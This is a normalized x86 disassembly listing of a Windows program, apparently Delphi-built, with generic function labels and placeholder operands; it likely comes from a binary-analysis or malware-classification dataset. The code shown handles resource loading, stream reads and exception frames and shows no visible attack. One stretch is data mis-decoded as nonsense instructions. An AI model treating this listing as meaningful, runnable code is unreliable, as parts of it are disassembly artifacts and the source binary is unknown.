cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406858
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_40683c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_40682c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
test ecx ecx
jne r-xdata
sub_415d50
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415c70
sub_415da0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404338
mov ecx eax
mov edx esi
mov eax edi
call sub_415e68
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_415df8
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415e5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e62
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_415e68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415df8
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415b90
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415df8
pop ecx
sub_415ed4
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406828
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_415f24
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_415f6c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_415f9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_41a108
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
pushad
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
add [ eax + eax ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
and [ ecx + 0x41 ] ah
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
pop esp
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60 ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x7000415f ] bl
xor eax [ eax ]
jl r-xdata
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc [ ecx + 0x41 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
test dl dl
je r-xdata
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ecc
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ecc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
inc eax
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403f68
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4043d8
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov dl [ ebx ]
test dl dl
je r-xdata
sub_416070
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ecc
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ecc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4160c8
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403f68
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4043d8
mov al 0x1
inc ebx
sub_416120
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416197
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054b4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41619e
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410644
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4054b4
mov ecx eax
mov eax esi
pop edx
call sub_40cca4
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054b4
sub_4161a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41624a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416251
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f68
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419778
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b58
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41626c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413914
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413914
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41375c
sub_4162a4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413914
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413914
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4137a8
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41375c
sub_4162ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416485
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor edx edx
push ebp
push sub_416466
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41646d
mov eax [ rw-data ]
call sub_413c88
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416447
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4163f5
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4138b8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_413404
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163fc
mov eax [ ebp - 0x8 ]
call sub_403128
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410770
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41626c
pop ecx
mov edx esi
mov eax edi
call sub_4137a8
mov eax ebx
call sub_403128
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4161a4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_4162a4
pop ecx
inc esi
sub_4163fc
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_416494
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_41652f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax edi
call sub_4138b8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4137a8
mov eax esi
call sub_403128
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407b58
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416540
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413c24
mov edi eax
xor eax eax
push ebp
push sub_4165b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax edi
call sub_4138b8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4137a8
mov eax esi
call sub_403128
sub_4165e8
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
pop ecx
pop edx
pop ebx
retn
sub_41662c
push ebx
push esi
push edi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_415f6c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_416668
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418540
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418650
call sub_4165dc
sub_41668c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407b58
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403e78
sub_4166c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407b58
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418540
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416781
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416b04
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416b04
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416788
mov eax [ ebp - 0x8 ]
call sub_403128
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418650
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_4165dc
sub_4167b0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_4167d0
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404114
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033ac
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_4165dc
sub_416838
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413c24
mov esi eax
xor edx edx
push ebp
push sub_4168a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4168af
mov eax [ rw-data ]
call sub_413c88
retn
mov edx ebx
mov eax esi
call sub_4138b8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403128
mov edx ebx
mov eax esi
call sub_4137a8
sub_4168b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4169c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169ca
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
xor edx edx
push ebp
push sub_4169a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4169f8
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4160c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4138b8
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f10
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4161a4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4138b8
call sub_416838
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4138b8
mov edx eax
mov eax [ rw-data ]
call sub_413b9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4139ac
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_4169d4
push ebx
mov ebx eax
mov eax ebx
call sub_416ac8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415530
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_4169f8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403128
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4138b8
call sub_403128
inc edi
dec esi
jne r-xdata
sub_416a34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403070
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_412f4c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4030b4
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_412fc4
mov edi eax
mov edx [ esp + 0x4 ]
call sub_412ec4
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_40308c
test al al
jne r-xdata
sub_416b04
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_416b50
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_416b50
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_416ba0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_416beb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4183a0
mov eax [ ebp - 0x4 ]
call sub_404138
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bf2
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
call sub_4165dc
sub_416bf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_416c98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41679c
test al al
jne r-xdata
mov eax ebx
call sub_41679c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4140f0
jmp r-xdata
mov eax ebx
call sub_416ae0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c9f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4140d0
mov esi eax
mov eax ebx
call sub_417700
jmp r-xdata
mov eax ebx
call sub_417650
mov eax ebx
call sub_41679c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41786c
mov eax ebx
call sub_417708
sub_416cc8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c40
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41375c
inc esi
dec ebx
jne r-xdata
sub_416d04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419894
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c40
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404dfc
add esp 0x4
mov edx ebx
mov eax edi
call sub_419868
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c40
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_419868
test [ eax + 0x24 ] 0x4
je r-xdata
sub_416d7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c40
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
